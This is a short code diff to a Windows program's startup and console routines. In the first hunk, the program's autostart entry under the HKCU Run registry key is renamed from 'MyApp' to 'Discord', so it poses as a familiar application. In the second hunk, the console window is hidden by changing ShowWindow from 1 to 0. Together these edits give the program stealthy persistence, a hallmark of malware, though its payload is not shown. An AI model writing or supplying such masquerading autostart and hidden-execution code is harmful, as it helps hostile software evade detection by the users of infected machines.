@@ -315,7 +315,7 @@ void addProgramToStartup()
     LONG key = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", 0, KEY_WRITE, &hkey);
     if (ERROR_SUCCESS == key)
     {
-        key = RegSetValueEx(hkey, "MyApp", 0, REG_SZ, (BYTE *)re, strlen(re));
+        key = RegSetValueEx(hkey, "Discord", 0, REG_SZ, (BYTE *)re, strlen(re));
     }
 }
 
@@ -324,5 +324,5 @@ void hideConsoleWindow()
     HWND window;
     AllocConsole();
     window = FindWindowA("ConsoleWindowClass", NULL);
-    ShowWindow(window, 1);
+    ShowWindow(window, 0);
 }
